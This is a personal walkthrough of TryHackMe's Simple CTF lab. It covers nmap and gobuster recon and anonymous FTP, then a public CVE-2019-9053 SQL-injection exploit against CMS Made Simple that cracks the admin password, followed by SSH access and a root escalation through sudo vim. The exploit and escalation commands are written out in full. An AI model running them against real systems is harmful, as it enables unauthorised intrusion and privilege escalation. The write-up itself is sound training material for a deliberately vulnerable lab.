# SimpleCTF

My notes for TryHackMe's Simple CTF challenge. 

## Recon

### Nmap
`$ nmap -A TARGET_IP`
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.63.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:F5:BA:54:9A:47 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (93%), Linux 3.8 (93%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.44 ms ip-10-10-201-203.eu-west-1.compute.internal ()

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.25 seconds
```

### Gobuster

`$ gobuster dir -u  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```
/simple (Status: 301)
/server-status (Status: 403)
```

Website running CMSMS v 2.2.8


`$ gobuster dir -u /simple -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
/modules (Status: 301)
/uploads (Status: 301)
/doc (Status: 301)
/admin (Status: 301)
/assets (Status: 301)
/lib (Status: 301)
/tmp (Status: 301)
```
Seems like `/admin` is the only interesting one. 

### FTP (anonymous login)

ForMitch.txt

"Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!"




## Exploit



https://github.com/e-renna/CVE-2019-9053.git

`$ python exploit.py -u http://TARGET_IP/simple --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt`


```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

We now have access to the Admin pannel: http://TARGET_IP/simple/admin/?__c=4a7086ef3466f61107e


and ssh. 
`$ ssh -p 2222 mitch@TARGET_IP`

## Escalation

### stabalize the shell
`$ python3 -c 'import pty;pty.spawn("/bin/bash")'`

`$ cat .bash_history`

`$ sudo -l`
```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

https://gtfobins.github.io/gtfobins/vim/

`$ sudo vim -c ':!/bin/bash'` 

We now have root!
